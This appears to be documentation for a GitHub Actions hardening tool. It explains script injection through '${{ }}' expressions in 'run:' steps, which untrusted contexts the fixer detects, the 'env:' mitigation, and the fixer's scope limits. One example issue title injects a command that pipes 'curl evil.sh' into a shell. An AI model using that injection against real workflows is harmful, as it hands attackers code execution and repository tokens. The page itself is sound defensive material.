# Script Injection in Workflow `run:` Steps

GitHub Actions expands `${{ ... }}` expressions as raw text substitution *before* the shell starts.
The expanded value is not an argument and not a variable — it becomes part of the script's source text.
An issue titled `"; curl evil.sh | sh #` interpolated into a `run:` step therefore terminates the intended command
and runs the attacker's own, with the job's token and runner access.

This is the classic GitHub Security Lab script-injection pattern,
and it is what the bundled `fix_injection` script detects and rewrites —
see [Remediate Code Injection](../how-to/remediate-code-injection.md).

## What Counts as Untrusted

The script matches expression bodies against a static table of context paths, `UNTRUSTED_CONTEXTS` in
[`src/scripts/fix_injection.py`](https://github.com/drts01/pin-actions/blob/trunk/src/scripts/fix_injection.py),
transcribed from GitHub Security Lab's untrusted-input list and CodeQL's `untrusted_event_properties.yml` data model.
It covers four kinds of source.

- **Anonymous event-payload text.**
  `github.event.issue.title`, `github.event.comment.body`, `github.event.pull_request.head.ref`, `github.head_ref`,
  `github.event.commits[N].message`, committer and author identity fields, release and milestone text,
  and `github.event.changes.*.from` (the previous value of an edited field).
- **Dispatch and input values.**
  `github.event.inputs.*` and bare `inputs.*` cover `workflow_dispatch`, `workflow_call`, and composite-action inputs;
  `github.event.client_payload.*` carries the `repository_dispatch` payload.
  These require dispatch or call access rather than anonymous access,
  but they are still attacker-chosen strings reaching a shell.
- **Whole-object references.**
  `${{ github.event.issue }}`, `${{ github.event }}`, or even bare `${{ github }}`.
  Interpolating an object stringifies every leaf, including the untrusted ones.
  These paths match exactly and never prefix-match,
  so a trusted leaf of the same object such as `github.event.issue.number` stays untouched.
- **Outputs of poisonable producer steps.**
  `steps.<id>.outputs.*` where `<id>` names a step that ran an action or command in CodeQL's
  [`poisonable_steps.yml`](https://github.com/github/codeql/blob/main/actions/ql/lib/ext/config/poisonable_steps.yml)
  list — `ruby/setup-ruby`, `mvn`, `pytest`, `terraform`, and others — whose output a malicious `pom.xml` or lockfile
  can influence.

## Why `env:` Indirection Fixes It

Moving the expression into the step's `env:` block changes when the value arrives and what it arrives as.
The template engine still expands the expression,
but it expands it into an environment-variable value rather than into the script body.
The shell sees only a variable reference, and the value stays data for the lifetime of the step,
so shell metacharacters in it are never parsed as syntax.
This is the mitigation GitHub's own security-hardening guidance prescribes, which is why the rewrite can be mechanical.

The script also quotes pre-existing bare `$VAR` and `$env:VAR` references in every `run:` step it scans,
whether or not that step contained an untrusted expression.
That closes the word-splitting and globbing gap (ShellCheck SC2086) an unquoted expansion leaves open.
Bash special and positional parameters
(`$@`, `$1`, `$$`, and similar)
and `$(...)`/`$((...))` substitutions are never touched,
and `cmd` steps are skipped because `%VAR%` expands regardless of quoting.

## Scope Boundaries

Detection is a single-pass, per-`run:`-step textual match over direct `${{ }}` interpolations,
plus one preliminary pass that maps step `id:` values to poisonable producers.
The script deliberately does not do the following.

- **Trace data flow.**
  An untrusted value assigned to `env.FOO` in one step and referenced as `env.FOO` in a later step is not detected.
  Indirect flow through prior job state is out of scope.
- **Model arbitrary third-party action outputs.**
  `steps.<id>.outputs.*` is untrusted only when the producing step matches the enumerated poisonable list above.
  Outputs of `actions/checkout`, `dorny/paths-filter`, `tj-actions/changed-files`,
  or any custom action are not modeled here; CodeQL tracks those through separate action-specific source classes.
- **Read `on:` triggers.**
  CodeQL falls back to flagging *any* `github.*` expression when it cannot resolve a workflow's trigger.
  This script does not adopt that fallback,
  because it would flag plainly trusted fields such as `github.repository` and `github.sha`.
- **Scan JavaScript.**
  `actions/github-script`'s `with.script` is JavaScript, not shell, and is never scanned or rewritten.
- **Detect "pwn requests."**
  `pull_request_target` or `workflow_run` combined with checking out
  and running untrusted head-ref code is a privilege-escalation class distinct from script injection.

## Related

- `zizmor`'s `template-injection` audit flags the same sink with broader static analysis,
  and its `dangerous-triggers` audit covers the pwn-request class excluded here —
  see [Comparing pin-actions to Similar Tools](comparison.md).
- [Threat Model](threat-model.md) — the mutable-ref supply-chain model that motivates pinning to a commit SHA,
  a concern separate from injection into `run:` text.
